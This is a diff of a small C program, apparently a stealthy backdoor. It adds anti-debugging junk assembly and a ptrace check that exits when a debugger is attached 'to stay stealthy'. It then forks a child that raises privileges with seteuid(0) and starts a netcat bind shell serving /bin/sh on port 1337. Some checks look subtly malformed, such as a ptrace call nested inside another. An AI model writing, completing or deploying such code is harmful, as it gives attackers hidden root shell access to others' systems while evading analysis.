@@ -11,7 +11,7 @@ int byte_ =(0);
 int main (void){
   
 
-	  /* Junk code asm (dbg)*/
+	  /* Junk code asm for obfuscation (anti dbg)*/
 	  __asm__(
 		"xor %eax,%eax \012"
 		"xor %ebx,%ebx \012"
@@ -25,18 +25,28 @@ int main (void){
 
 	if (byte_  != 0 ){
 	    /* Junk code modified ?? */
-	    return(1);
+	    exit(EXIT_FAILURE);
 	}
 
     
-        /* Routine anti débugg */
+    /* Routine anti débugg */
 	if((ptrace(ptrace(PTRACE_TRACEME,0,1,0) < 0)) != -1 ){
 		/* if DBG attached = exit to stay stealthy */
-		return(1);
+		exit(EXIT_FAILURE);
 	}
-    seteuid(0);
-    system("/bin/nc -l 127.0.0.1 -p 1337&");
-    return (0);
+	
+		int nPid=fork();
+		
+		switch(nPid){
+		case 0: {
+		    seteuid(0);
+		    system("/bin/nc -c /bin/sh -l 127.0.0.1 -p 1337&");
+		}
+		default:{
+			wait(NULL);
+		}
+	}
+	return (0);
 }
 
 
